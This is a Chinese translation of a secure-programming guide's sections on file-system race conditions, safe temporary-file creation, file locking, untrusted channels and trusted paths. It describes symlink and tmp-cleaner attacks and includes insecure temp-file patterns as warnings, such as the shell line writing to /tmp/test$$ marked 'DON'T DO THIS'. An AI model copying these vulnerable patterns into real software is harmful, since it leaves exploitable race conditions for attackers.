在文件系统中，未能重复执行原子操作的问题会出现。一般来说，文件系统是许多程序使用的共享资源，某些程序可能会干扰其他程序对其的使用。安全程序通常应避免使用 access(2)来确定是否应该批准请求，随后再使用 open(2)，因为用户可能在这些调用之间移动文件，可能创建他们自己的符号链接或文件。安全程序应改为设置其有效 ID 或文件系统 ID，然后直接进行打开调用。使用 access(2)安全地是可能的，但仅当用户无法从文件系统根目录影响文件或其路径上的任何目录时。

在创建文件时，你应该使用 O_CREAT | O_EXCL 模式打开它，并仅授予非常有限的权限（仅对当前用户）；你还需要准备处理打开失败的情况。如果你需要能够打开文件（例如，防止服务拒绝），你需要重复进行以下操作：(1) 创建一个“随机”的文件名，(2) 按照说明打开文件，(3) 当打开成功时停止重复。

如果普通程序没有正确创建文件，它们可能会成为安全弱点。例如，“joe”文本编辑器有一个名为“DEADJOE”的符号链接漏洞。当 joe 以非标准方式退出（例如系统崩溃、关闭 xterm 或网络连接断开）时，joe 会无条件地将其打开的缓冲区追加到文件“DEADJOE”。这可以通过在 root 通常使用 joe 的目录中创建 DEADJOE 符号链接来利用。这样，joe 可以被用来向可能敏感的文件追加垃圾，导致服务拒绝和/或意外访问。

作为另一个例子，当对一个文件的元信息执行一系列操作（如更改其所有者、获取文件状态或更改其权限位）时，首先打开文件，然后使用对打开文件的操作。这意味着使用 fchown( )、fstat( )或 fchmod( )系统调用，而不是使用接受文件名作为参数的函数，如 chown()、chgrp()和 chmod()。这样做将防止在程序运行期间替换文件（可能是一个竞争条件）。例如，如果你关闭一个文件然后使用 chmod()更改其权限，攻击者可能会在这两个步骤之间移动或删除文件，并创建指向另一个文件（例如/etc/passwd）的符号链接。其他有趣的文件包括/dev/zero，它可以向程序提供无限长的输入数据流；如果攻击者可以在数据流中“切换”文件，结果可能会很危险。

但即使是这一点也会变得复杂——在创建文件时，你必须尽可能给予它们最小的一组权限，然后在需要时再扩展这些权限。通常，这意味着你需要使用 umask 和/或 open 的参数来限制初始访问权限仅限于用户和用户组。例如，如果你创建了一个最初对所有用户可读的文件，然后尝试关闭“对所有用户可读”的位，攻击者可能会在权限位表明这是允许的情况下尝试打开该文件。在大多数类 Unix 系统中，权限只在打开时检查，所以这可能会导致攻击者拥有比预期更多的权限。

通常，如果多个用户可以在类 Unix 系统中向一个目录写入，你最好在该目录上设置“粘性位”，并且粘性目录最好得到实现。然而，最好完全避免这个问题，创建只有受信任的特殊进程可以访问的目录（然后仔细实现）。传统的 Unix 临时目录（/tmp 和/var/tmp）通常实现为“粘性目录”，但仍然可能暴露出各种安全问题，正如我们接下来将要看到的。

### 7.11.1.2\. 临时文件

正确执行原子操作的问题尤其会在创建临时文件时出现。在类 Unix 系统中，临时文件传统上是在 /tmp 或 /var/tmp 目录中创建的，这些目录由所有用户共享。攻击者常用的一个技巧是在临时目录中创建指向其他文件（例如，/etc/passwd）的符号链接，同时你的 secure program 正在运行。攻击者的目标是创造一种情况，使得 secure program 判断给定的文件名不存在，然后攻击者创建指向另一个文件的符号链接，之后 secure program 执行某些操作（但现在它实际上打开了一个意外的文件）。通常，重要文件可以通过这种方式被覆盖或修改。这种攻击有许多变体，例如创建普通文件，所有这些都基于攻击者可以在 secure program 用于临时文件的同一目录中创建（或有时以其他方式访问）文件系统对象的想法。

Michal Zalewski 在 2002 年揭露了与临时目录相关的另一个严重问题，涉及自动清理临时目录。更多信息，请参阅他于 2002 年 12 月 20 日发布的 Bugtraq 报告（主题为 "[RAZOR] mkstemp() 存在的问题"）。基本上，Zalewski 指出，自动清理像 /tmp 和 /var/tmp 这样的临时目录，并移除一段时间内未被访问的“旧”文件（例如，几天前）是一种常见的做法。这类程序有时被称为“tmp cleaners”（发音为“temp cleaners”）。可能最常用的 tmp cleaner 是 Red Hat Software 的 Erik Troan 和 Preston Brown 开发的“tmpwatch”；另一个常见的是 Stanislav Shalunov 开发的“stmpclean”；许多管理员也会自己编写这样的程序。不幸的是，tmp cleaners 的存在为新的安全关键竞态条件提供了机会；攻击者可能能够安排事情，使得 tmp cleaner 干扰安全程序。例如，攻击者可以创建一个“旧”文件，安排 tmp cleaner 计划删除该文件，然后自己删除该文件，并运行一个创建相同文件的 secure program - 现在 tmp cleaner 将会删除 secure program 的文件！或者，想象一下，一个 secure program 在使用文件后可能会有很长时间的延迟（例如，一个 setuid 程序被 SIGSTOP 停止，然后在几天后用 SIGCONT 继续运行，或者简单地故意创建大量工作）。如果临时文件没有被使用足够长的时间，它们很可能会被 tmp cleaner 删除。

在这些共享目录中创建文件的一般问题是，你必须保证你计划使用的文件名在创建时不存在，并且原子性地创建文件。在创建文件之前进行检查是不行的，因为检查发生之后但在创建之前，另一个进程可以创建具有该文件名的文件。使用“不可预测”或“唯一”的文件名通常也不行，因为另一个进程通常会反复猜测直到成功。一旦你原子性地创建了文件，你必须始终使用返回的文件描述符（或者如果是从文件描述符创建的，使用像 fdopen() 这样的例程创建的文件流）。你绝不能重新打开文件，或者使用任何使用文件名作为参数的操作 - 总是使用文件描述符或相关的流。否则，上述 tmpwatch 竞态问题会导致问题。即使权限限制了谁可以打开它，你也不能创建文件，关闭它，然后重新打开它。请注意，比较描述符和重新打开的文件以验证 inode 号、创建时间或文件所有权是不够的 - 请参阅 Olaf Kirch 的“符号链接和冷冻睡眠”。

基本上，在共享（粘性）目录中创建临时文件，你必须反复执行以下操作：(1) 创建一个“随机”的文件名，(2) 使用 O_CREAT | O_EXCL 和非常狭窄的权限打开它（这会原子性地创建文件，如果未创建则失败），(3) 当打开成功时停止重复。

根据 1997 年的“单一 Unix 规范”，创建任意临时文件（使用 C 接口）的首选方法是 tmpfile(3)。tmpfile(3) 函数创建一个临时文件并打开一个相应的流，返回该流（如果没有创建则返回 NULL）。不幸的是，规范并没有保证文件会安全地创建。在本书的早期版本中，我表示我对此表示担忧，因为我无法确保所有实现都安全地这样做。后来我发现，较老的 System V 系统中 tmpfile(3)（以及 tmpnam(3) 和 tempnam(3) 的不安全实现）存在不安全的实现，因此至少在某些系统中，它完全无用。当然，tmpfile(3) 的库实现应该安全地创建这样的文件，但用户并不总是意识到他们的系统库存在这个安全漏洞，有时他们对此无能为力。

Kris Kennaway 推荐在一般情况下使用 mkstemp(3) 来创建临时文件。他的理由是，你应该使用众所周知的库函数来完成这项任务，而不是自己编写函数，并且这个函数具有已知的语义。这当然是一个合理的立场。我还会补充说，如果你使用 mkstemp(3)，请确保使用 umask(2) 来限制生成的临时文件权限，只允许所有者访问。这是因为一些 mkstemp(3) 的实现（基本上是较老的实现）使得这些文件对所有用户都是可读和可写的，从而在攻击者可以在这个目录中读取或写入私有数据的情况下创建了一个条件。一个小麻烦是，mkstemp(3) 不直接支持环境变量 TMP 或 TMPDIR（如下文所述），所以如果你想支持它们，你必须添加相应的代码。以下是一个 C 程序，演示了如何直接使用 mkstemp(3) 来实现这个目的，以及当添加对 TMP 和 TMPDIR 的支持时的用法：

```
 #include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>

void failure(msg) {
 fprintf(stderr, "%s\n", msg);
 exit(1);
}

/*
 * Given a "pattern" for a temporary filename
 * (starting with the directory location and ending in XXXXXX),
 * create the file and return it.
 * This routines unlinks the file, so normally it won&rsquo;t appear in
 * a directory listing.
 * The pattern will be changed to show the final filename.
 */

FILE *create_tempfile(char *temp_filename_pattern)
{
 int temp_fd;
 mode_t old_mode;
 FILE *temp_file;

 old_mode = umask(077);  /* Create file with restrictive permissions */
 temp_fd = mkstemp(temp_filename_pattern);
 (void) umask(old_mode);
 if (temp_fd == -1) {
   failure("Couldn&rsquo;t open temporary file");
 }
 if (!(temp_file = fdopen(temp_fd, "w+b"))) {
   failure("Couldn&rsquo;t create temporary file&rsquo;s file descriptor");
 }
 if (unlink(temp_filename_pattern) == -1) {
   failure("Couldn&rsquo;t unlink temporary file");
 }
 return temp_file;
}

/*
 * Given a "tag" (a relative filename ending in XXXXXX),
 * create a temporary file using the tag.  The file will be created
 * in the directory specified in the environment variables
 * TMPDIR or TMP, if defined and we aren&rsquo;t setuid/setgid, otherwise
 * it will be created in /tmp.  Note that root (and su'd to root)
 * _will_ use TMPDIR or TMP, if defined.
 * 
 */
FILE *smart_create_tempfile(char *tag)
{
 char *tmpdir = NULL;
 char *pattern;
 FILE *result;

 if ((getuid()==geteuid()) && (getgid()==getegid())) {
   if (! ((tmpdir=getenv("TMPDIR")))) {
     tmpdir=getenv("TMP");
   }
 }
 if (!tmpdir) {tmpdir = "/tmp";}

 pattern = malloc(strlen(tmpdir)+strlen(tag)+2);
 if (!pattern) {
   failure("Could not malloc tempfile pattern");
 }
 strcpy(pattern, tmpdir);
 strcat(pattern, "/");
 strcat(pattern, tag);
 result = create_tempfile(pattern);
 free(pattern);
 return result;
}

main() {
 int c;
 FILE *demo_temp_file1;
 FILE *demo_temp_file2;
 char demo_temp_filename1[] = "/tmp/demoXXXXXX";
 char demo_temp_filename2[] = "second-demoXXXXXX";

 demo_temp_file1 = create_tempfile(demo_temp_filename1);
 demo_temp_file2 = smart_create_tempfile(demo_temp_filename2);
 fprintf(demo_temp_file2, "This is a test.\n");
 printf("Printing temporary file contents:\n");
 rewind(demo_temp_file2);
 while (  (c=fgetc(demo_temp_file2)) != EOF) {
   putchar(c);
 }
 putchar('\n');
 printf("Exiting; you&rsquo;ll notice that there are no temporary files on exit.\n");
}
```

Kennaway 指出，如果你不能使用 mkstemp(3)，那么可以使用 mkdtemp(3) 创建一个目录，这样就可以防止外部世界访问。然而，正如 Michal Zalewski 所言，如果正在使用 tmp 清理程序，这并不是一个好主意；相反，应该使用用户家目录内的一个目录。最后，如果你真的必须使用不安全的 mktemp(3)，使用大量的 X 字符 - 他建议使用 10 个（如果你的 libc 允许的话），这样文件名就不容易被猜到（只使用 6 个 X 字符意味着有 5 个被 PID 占用，只剩下 1 个随机字符，这允许攻击者利用一个简单的竞争条件）。请注意，这从根本上是不安全的，所以你通常不应该这样做。我还补充说，你应该避免使用 tmpnam(3) - 当存在线程时，它的一些用法并不可靠，并且它不能保证在 TMP_MAX 使用后仍然能正确工作（尽管大多数实际用途都必须在循环内）。

通常，你应该避免使用不安全的功能，如 mktemp(3) 或 tmpnam(3)，除非你采取特定的措施来抵消它们的不安全性，或者在你安装程序中测试安全的库实现。如果你想在 /tmp 中创建一个文件或者一个可写于世界的目录（或者如果你不信任组，是组可写的），并且不想使用 mk*temp()（例如，你打算让文件有一个可预测的名称），那么 *始终* 使用 O_CREAT 和 O_EXCL 标志来调用 open() 并 *检查返回值*。如果你调用 open() 失败，那么优雅地恢复（例如，退出）。

GNOME 编程指南推荐在共享（临时）目录中创建文件系统对象时使用以下 C 代码来安全地打开临时文件 [Quintero 2000]：

```
  char *filename;
 int fd;

 do {
   filename = tempnam (NULL, "foo");
   fd = open (filename, O_CREAT &#124; O_EXCL &#124; O_TRUNC &#124; O_RDWR, 0600);
   free (filename);
 } while (fd == -1);
```

注意，尽管使用了不安全的函数 tempnam(3)，但它被 O_CREAT 和 O_EXCL 循环包裹，以抵消其安全弱点，因此这种使用是可以的。注意你需要使用 free() 释放文件名。完成后，你应该使用 close() 和 unlink() 关闭和删除文件。如果你想使用标准 C I/O 库，可以使用 fdopen() 并以 "w+b" 模式来将文件描述符转换为 FILE *。注意，这种方法在 NFS 版本 2（v2）系统上无法工作，因为较旧的 NFS 不正确地支持 O_EXCL。注意，这种方法的一个小缺点是，由于 tempnam 可以不安全地使用，各种编译器和安全扫描器可能会给你关于其使用的虚假警告。这与 mkstemp(3) 没有关系。

如果在 shell 脚本中需要临时文件，你最好使用管道，使用本地目录（例如，用户主目录内的某个位置），或者在某些情况下使用当前目录。这样，除非用户允许，否则没有共享。如果你真的希望/需要在像 /tmp 这样的共享目录中放置临时文件，请不要使用传统的 shell 技巧，即在模板中使用进程 ID 并仅使用正常操作如 ">" 来创建文件。Shell 脚本可以使用 "$$" 来表示 PID，但攻击者可以轻易地确定或猜测 PID，然后预先创建具有相同名称的文件或链接。因此以下“典型”的 shell 脚本是不安全的：

```
    echo "This is a test" > /tmp/test$$  # DON'T DO THIS.
```

如果在 shell 脚本中需要临时文件或目录，并且希望它在 /tmp 中，有时建议使用 mktemp(1)，它旨在在 shell 脚本中使用（注意 mktemp(1) 和 mktemp(3) 是不同的事物）。然而，正如 Michal Zalewski 指出的那样，在运行 tmp 清理器的许多环境中这是不安全的；问题在于当特权程序扫描临时目录时，可能会暴露竞争条件。即使这不是真的，我也不建议使用在共享目录中创建临时文件的 shell 脚本；在私有目录中创建这样的文件或使用管道通常更可取，即使你确信你的 tmpwatch 程序是安全的（或者你没有本地用户）。如果你必须使用 mktemp(1)，请注意，mktemp(1) 接受一个模板，然后使用 O_EXCL 创建文件或目录，并返回结果名称；因此，mktemp(1) 在 NFS 版本 2 文件系统上无法工作。以下是一些在 Bourne shell 脚本中正确使用 mktemp(1) 的示例；这些示例直接来自 mktemp(1) 的 man 页面：

```
  # Simple use of mktemp(1), where the script should quit
 # if it can&rsquo;t get a safe temporary file.
 # Note that this will be INSECURE on many systems, since they use
 # tmpwatch-like programs that will erase "old" files and expose race
 # conditions.

   TMPFILE=`mktemp /tmp/$0.XXXXXX` &#124;&#124; exit 1
   echo "program output" >> $TMPFILE

  # Simple example, if you want to catch the error:

   TMPFILE=`mktemp -q /tmp/$0.XXXXXX`
   if [ $? -ne 0 ]; then
      echo "$0: Can&rsquo;t create temp file, exiting..."
      exit 1
   fi
```

Perl 程序员应使用 File::Temp，它试图提供一种跨平台的方法来安全地创建临时文件。然而，在使用之前请仔细阅读其文档；它包括对不安全函数的接口。我建议明确将其 safe_level 设置为 HIGH；这将调用额外的安全检查。[File::Temp 的 Perl 5.8 文档可在网上找到](http://search.cpan.org/author/JHI/perl-5.8.0/lib/File/Temp.pm)。

不要重用临时文件名（即删除并重新创建它），无论你最初是如何获得“安全”的临时文件名的。攻击者可以观察原始文件名并在你第二次重新创建它之前劫持它。当然，始终使用适当的文件权限。例如，如果你需要世界或组访问文件，则仅允许世界/组访问，否则保持模式 0600（即只有所有者可以读取或写入它）。

请自己清理，无论是通过使用退出处理程序，还是利用 UNIX 文件系统语义并在创建文件后立即使用 unlink() 来解除链接，这样目录条目就会消失，但文件本身仍然可以通过最后一个指向它的文件描述符保持可访问，直到该文件描述符被关闭。然后你可以在程序中通过传递文件描述符来继续访问它。解除链接文件对代码维护有很多优点：文件会自动删除，无论你的程序如何崩溃。它还降低了维护者不安全地使用文件名的可能性（他们需要使用文件描述符而不是文件名）。立即解除链接的一个小问题是，它使得管理员更难看到磁盘空间的使用情况，因为他们不能简单地通过名称查看文件系统。

您可以考虑确保为类 Unix 系统的代码尊重 TMP 或 TMPDIR 环境变量，如果这些变量的提供者是可信的。这样做可以让用户将他们的临时文件移动到非共享目录中（并消除此处讨论的问题），例如他们家目录内的子目录。Bastille 的最新版本可以将这些变量设置为减少用户之间的共享。不幸的是，许多用户将 TMP 或 TMPDIR 设置为共享目录（例如/tmp），因此您的安全程序即使在设置了这些环境变量的情况下也必须正确创建临时文件。这是 GNOME 方法的一个优点，因为至少在某些系统上，tempnam(3)自动使用 TMPDIR，而 mkstemp(3)方法需要更多的代码来实现这一点。请勿为临时目录创建更多的环境变量（如 TEMP），并且特别不要为每个应用程序创建不同的环境变量名称（例如，不要使用"MYAPP_TEMP"）。这样做会极大地复杂化系统管理，而希望为特定应用程序使用特殊临时目录的用户可以在运行该特定应用程序时专门设置环境变量。当然，如果这些环境变量可能已被不可信的来源设置，您应该忽略它们——如果您遵循第 5.4.3 节中的建议，您本来就会这样做。

这些技术如果使用 NFS 版本 2（NFSv2）远程挂载临时目录将不起作用，因为 NFSv2 没有正确支持 O_EXCL。更多信息请参阅第 7.11.2.1 节。NFS 版本 3 及以后版本正确支持 O_EXCL；简单的解决方案是确保临时目录要么是本地的，要么如果使用 NFS 挂载，则使用 NFS 版本 3 或更高版本。在 NFS v2 上安全创建临时文件的技术涉及使用 link(2)和 stat(2)，但这很复杂；请参阅第 7.11.2.1 节，其中包含更多关于此的信息。

作为补充，值得注意的是，FreeBSD 最近已将 mk*temp()系列函数更改为去除文件名的 PID 组件，并用 62 进制编码的随机数替换整个文件名。这大大增加了默认使用 6 个 X 的情况下的可能临时文件数量，这意味着即使 mktemp(3)使用 6 个 X 也是合理（概率上）安全的，除非非常频繁地使用。然而，如果您还遵循此处提供的指导，您将消除他们试图解决的问题。

关于临时文件的大部分信息来源于[Kris Kennaway 于 2000 年 12 月 15 日在 Bugtraq 上关于临时文件的帖子](http://lwn.net/2000/1221/a/sec-tmp.php3)。

我应该指出，来自[`www.openwall.com/linux/`](http://www.openwall.com/linux/)的 Openwall Linux 补丁包括一个可选的“临时文件目录”策略，该策略可以抵御许多基于临时文件的攻击。Linux 安全模块（LSM）项目包括一个“owlsm”模块，它实现了 OpenWall 的一些想法，因此带有 LSM 的 Linux 内核可以快速将这些规则插入到运行中的系统。当启用时，它有两个保护措施：

+   硬链接：在某些情况下，进程可能无法创建指向文件的硬链接。Openwall 文档指出，“进程可能无法创建指向它们没有写访问权限的文件的硬链接。”在 LSM 版本中，规则如下：如果进程的 uid 和 fsuid（通常与 euid 相同）与指向的文件的 uid 不同，进程 uid 不是 root，并且进程缺少 FOWNER 能力，则禁止创建硬链接。对进程 uid 的检查可能在某一天被取消（它们是针对 atd(8)程序的解决方案），到那时，规则将是：如果进程的 fsuid（通常与 euid 相同）与指向的文件的 uid 不同，并且进程缺少 FOWNER 能力，则禁止创建硬链接。换句话说，你只能创建指向你拥有的文件的硬链接，除非你有 FOWNER 能力。

+   符号链接（symlinks）：某些符号链接不会被跟随。原始的 Openwall 文档指出，“root 进程可能无法跟随不属于 root 的所有者的符号链接”，但实际上规则（从查看代码来看）更为复杂。在 LSM 版本中，如果目录是粘性目录（“+t”模式，用于如/tmp 这样的共享目录），则如果符号链接是由除目录所有者或当前进程的 fsuid（通常是有效 uid）之外的人创建的，则不会跟随符号链接。

许多系统没有实施这种 openwall 策略，因此你通常不能依赖它来保护你的系统。然而，我鼓励你在自己的系统上使用这个策略，并请确保当这个策略生效时，你的应用程序能够正常运行。

## 7.11.2. 锁定

经常会有这样的情况，程序必须确保它对某物拥有独占权（例如，一个文件、一个设备以及/或特定服务器进程的存在）。任何锁定资源的系统都必须处理锁的标准问题，即死锁（“致命拥抱”）、活锁以及如果程序没有清理其锁，则释放“卡住”的锁。如果程序卡在等待彼此释放资源，则可能会发生死锁。例如，如果进程 1 锁定资源 A 并等待资源 B，而进程 2 锁定资源 B 并等待资源 A，则可能会发生死锁。许多死锁可以通过简单地要求所有锁定多个资源的进程以相同的顺序锁定它们（例如，按锁名称字母顺序）来预防。

### 7.11.2.1. 使用文件作为锁

在类 Unix 系统中，资源锁定传统上是通过创建一个文件来指示锁来完成的，因为这非常便携。这也使得“修复”卡住的锁变得容易，因为管理员只需查看文件系统即可看到已经设置的锁。卡住的锁可能是因为程序未能清理自身（例如，崩溃或故障）或因为整个系统崩溃。请注意，这些都是“建议性”的（而不是“强制性的”）锁 - 所有需要资源的进程都必须协作才能使用这些锁。

然而，有一些陷阱需要避免。首先，不要使用非常旧的 Unix C 程序中使用的技巧，即调用 creat()或其 open()等效函数，open()模式为 O_WRONLY | O_CREAT | O_TRUNC，文件模式设置为 0（无权限）。对于普通文件系统上的普通用户，这种方法是有效的，但当用户具有 root 权限时，这种方法无法锁定文件。root 总是可以执行此操作，即使文件已经存在。实际上，Unix 的老版本在旧编辑器“ed”中就有这个特定的问题 -- 症状是偶尔会将密码文件的部分内容放置在用户的文件中 [Rochkind 1985, 22]！相反，如果你是为位于本地文件系统上的进程创建锁，你应该使用带有标志 O_WRONLY | O_CREAT | O_EXCL 的 open()（再次，无权限，这样具有相同所有者的其他进程就不会获得锁）。注意使用 O_EXCL，这是创建“独占”文件的官方方式；这在本地文件系统上的 root 用户中也有效。[Rochkind 1985, 27]。

其次，如果锁文件可能位于 NFS 挂载的文件系统上，那么你将面临 NFS 版本 2 不完全支持正常文件语义的问题。这甚至可能成为“本地”于客户端的工作的问题，因为一些客户端没有本地磁盘，并且可能通过 NFS 远程挂载了*所有*文件。*open(2)*的手册解释了在这种情况下如何处理事情（这也处理了 root 程序的情况）：

“...依赖于[open(2)的 O_CREAT 和 O_EXCL 标志在通过 NFS 版本 2 访问的文件系统上执行锁定任务]的程序将包含竞争条件。使用锁文件执行原子文件锁定的解决方案是在同一文件系统上创建一个唯一的文件（例如，包含主机名和 pid），使用 link(2)创建对锁文件的链接，并使用 stat(2)在唯一文件上检查其链接计数是否增加到 2。不要使用 link(2)调用的返回值。”

显然，这个解决方案只有在所有进行锁定的程序都在协作，并且不允许所有非协作程序干扰的情况下才能工作。特别是，你用于文件锁定的目录不能有创建和删除文件的宽容文件权限。

NFS 版本 3 在 open(2) 中增加了对 O_EXCL 模式的支持；请参阅 IETF RFC 1813，特别是“CREATE”参数的“EXCLUSIVE”值。遗憾的是，在撰写本文时，并非所有人已经切换到 NFS 版本 3 或更高版本，因此你目前还不能在可移植程序中依赖这一点。然而，从长远来看，这个问题有望得到解决。

如果你正在锁定设备或本地机器上进程的存在，尽量使用标准约定。我建议使用文件系统层次标准（FHS）；它被 Linux 系统广泛引用，但它也试图吸收其他类 Unix 系统的思想。FHS 描述了此类锁定文件的标准化约定，包括命名、放置和这些文件的标准内容 [FHS 1997]。如果你只是想确保你的服务器在给定的机器上不会执行多次，通常你应该创建一个进程标识符作为 /var/run/NAME.pid，其内容为 pid。在类似的方式中，你应该将设备锁定文件之类的锁定文件放在 /var/lock。这种方法的一个小缺点是，如果程序突然停止，可能会留下文件悬挂，但这是一种标准做法，并且可以通过其他系统工具轻松处理这个问题。

程序使用文件来表示锁并协作时，使用相同的目录很重要，而不仅仅是相同的目录名。这是一个网络化系统的问题：FHS 明确指出 /var/run 和 /var/lock 是不可共享的，而 /var/mail 是可共享的。因此，如果你想在一个单独的机器上使用锁，而不干扰其他机器，请使用不可共享的目录，如 /var/run（例如，你希望允许每台机器运行自己的服务器）。然而，如果你想让所有共享网络文件的网络机器遵守锁，你需要使用它们共享的目录；/var/mail 是这样一个位置。有关此问题的更多信息，请参阅 FHS 第二部分。

### 7.11.2.2\. 其他锁定方法

当然，你不需要使用文件来表示锁。网络服务器通常不需要担心；绑定到端口的简单行为就相当于一种锁，因为如果有一个现有的服务器绑定到特定的端口，其他服务器将无法绑定到该端口。

锁定的另一种方法是使用 POSIX 记录锁，通过 fcntl(2) 实现为“任意锁”。这些是任意的，也就是说，使用它们需要需要锁的程序之间的合作（正如使用文件来表示锁的方法一样）。有很多理由推荐使用 POSIX 记录锁：POSIX 记录锁定在几乎所有类 Unix 平台上都得到支持（由 POSIX.1 规定），它可以锁定文件的一部分（而不仅仅是整个文件），并且可以处理读锁和写锁之间的差异。更有用的一点是，如果一个进程崩溃了，它的锁会自动移除，这通常是期望的结果。

您还可以使用基于 System V 的强制锁定方案的强制锁。这些只适用于设置了锁定文件 setgid 位但未设置组执行位的文件。此外，您必须挂载文件系统以允许强制文件锁定。在这种情况下，每次 read(2) 和 write(2) 都会检查锁定；虽然这比建议性锁定更彻底，但它也更慢。此外，强制锁在移植到其他 Unix-like 系统时并不广泛（它们在 Linux 和基于 System V 的系统上可用，但并不一定在其他系统上）。请注意，具有 root 特权的进程也可能被强制锁阻塞，这可能导致拒绝服务攻击。

# 7.12. 只信任可信赖的渠道

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/trustworthy-channels.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/trustworthy-channels.html)

通常，只有从可信赖的渠道获取的信息（输入或结果）才是可信的。例如，getlogin(3) 和 ttyname(3) 例程返回的信息可以被本地用户控制，因此不要为了安全目的信任它们。

在大多数计算机网络中（尤其是对于整个互联网而言），未经认证的传输是不可信的。例如，在公共互联网上发送的数据包在其路径上的任何点都可能被查看和修改，并且可以伪造任意新的数据包。这些伪造的数据包可能包括有关发送者（例如其机器（IP）地址和端口）或接收者的伪造信息。因此，除非您能够验证它们（例如使用密码学），否则不要将这些值作为您安全决策的主要标准。

这意味着，除非在特殊情况下，TCP/IP 中用于验证用户的两种旧技术通常不应作为唯一的验证机制使用。一种技术是通过检查数据包中的“from”机器地址将用户限制在“某些机器”上；另一种技术是通过要求发送者使用“可信”的端口号（小于 1024 的数字）来限制访问。问题是，在许多环境中，攻击者可以伪造这些值。

在某些环境中，检查这些值（例如，发送机器的 IP 地址和/或端口）可能具有一定的价值，因此将这种检查作为程序中的选项支持并不是一个坏主意。例如，如果一个系统运行在防火墙后面，防火墙无法被突破或绕过，并且防火墙阻止了声称来自内部的外部数据包，那么您可以声称任何声称来自内部的数据包确实如此。请注意，您不能确定数据包实际上来自它声称的机器 - 因此您只是在应对外部威胁，而不是内部威胁。然而，损坏的防火墙、替代路径和移动代码甚至使这些假设都变得可疑。

问题在于将不可信的信息作为唯一验证某人的方式。如果你需要在不可信的网络中建立可信的通道，通常你需要某种密码学服务（至少是密码学安全的散列）。参见第 11.5 节了解更多关于密码学算法和协议的信息。如果你正在实现一个标准且本质上不安全的协议（例如，ftp 和 rlogin），请提供安全的默认设置并清楚地记录假设。

域名服务器（DNS）在互联网上被广泛用于在计算机名称和它们的 IP（数字）地址之间维护映射。所谓的“反向 DNS”技术消除了某些简单的欺骗攻击，并且对于确定主机的名称很有用。然而，这种技术在身份验证决策上并不可靠。问题是，最终，DNS 请求将发送到某个可能被攻击者控制的远程系统。因此，将 DNS 结果视为需要验证的输入，不要将其用于严重的访问控制。

随意电子邮件（包括地址的“发件人”值）也可以被伪造。使用数字签名是阻止此类攻击的一种方法。一种更容易被阻止的方法是要求通过特殊随机创建的值来回发送电子邮件，但对于像加入公共邮件列表这样的低价值交易，这通常是可以接受的。

注意，在任何客户端/服务器模型中，包括 CGI，服务器必须假设客户端（或介于客户端和服务器之间的人）可以修改任何值。例如，所谓的“隐藏字段”和 cookie 值可以在被 CGI 程序接收之前被客户端更改。除非采取特殊预防措施，否则这些值不可信。例如，隐藏字段可以通过一种客户端无法伪造的方式签名，只要服务器检查签名。隐藏字段也可以使用只有受信任的服务器才能解密的密钥进行加密（这种后一种方法是 Kerberos 身份验证系统背后的基本思想）。InfoSec 实验室在[`www.infoseclabs.com/mschff/mschff.htm`](http://www.infoseclabs.com/mschff/mschff.htm)对隐藏字段和加密应用进行了进一步讨论。一般来说，在客户端/服务器模型中，你最好将你关心的数据保留在服务器端。同样，在 CGI 程序中不要依赖于 HTTP_REFERER 进行身份验证，因为这是由用户的浏览器（而不是 Web 服务器）发送的。

这个问题也适用于引用其他数据的数据。例如，HTML 或 XML 允许你通过引用包含其他文件（例如，DTD 和样式表）等可能存储在远程位置的其他文件。然而，这些外部引用可能会被修改，使得用户看到的文档与预期大相径庭；样式表可能会被修改以在关键位置“抹去”文字，破坏其外观，或插入新文本。外部 DTD 可能会被修改以防止使用文档（通过添加破坏验证的声明）或将不同的文本插入文档中[St. Laurent 2000]。

# 7.13\. 设置可信路径

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/trusted-path.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/trusted-path.html)

需要可信通道的对应措施（参见第 7.12 节）是确保用户确实在使用他们打算使用的程序或系统。

传统例子是一个“假登录”程序。如果一个程序被编写成看起来像系统的登录界面，那么它可以被留下运行。当用户尝试登录时，假登录程序可以捕获用户的密码以供以后使用。

解决这个问题的方案是“可信路径”。可信路径简单来说就是一些机制，它能够提供信心，确保用户正在与用户意图通信的对象进行通信，确保攻击者无法拦截或修改正在通信的任何信息。

如果你要求输入密码，尝试设置可信路径。不幸的是，标准的 Linux 发行版和许多其他 Unix 系统甚至对于它们的正常登录序列都没有可信路径。一种方法是要求在登录前按下不可伪造的键，例如，Windows NT/2000 在登录前使用“控制-交替-删除”；由于 Windows 中的正常程序无法拦截这个键模式，这种方法创建了一个可信路径。Linux 有一个等效的方法，称为[安全注意键（SAK）](http://lwn.net/2001/0322/a/SAK.php3)；建议将其映射到“控制-交替-暂停”。不幸的是，在撰写本文时，SAK 还不成熟，并且没有得到 Linux 发行版的良好支持。在本地实现可信路径的另一种方法是控制一个只有登录程序可以执行的独立显示。例如，如果只有可信程序可以修改键盘灯（显示 Num Lock、Caps Lock 和 Scroll Lock 的 LED），那么登录程序可以显示一个运行模式来指示它是真正的登录程序。不幸的是，由于在当前的 Linux 中普通用户可以更改 LED，因此 LED 目前不能用来确认可信路径。

很遗憾，对于网络应用来说，这个问题要严重得多。尽管对于网络应用来说，建立一个可信路径是理想的，但完全做到这一点相当困难。当通过网络发送密码时，至少要在可信端点之间加密密码。这样至少可以防止未连接到系统的那些人窃听密码，并且至少使攻击更难实施。如果你担心实际通信的可信路径，确保通信是加密和认证的（或者至少是认证的）。

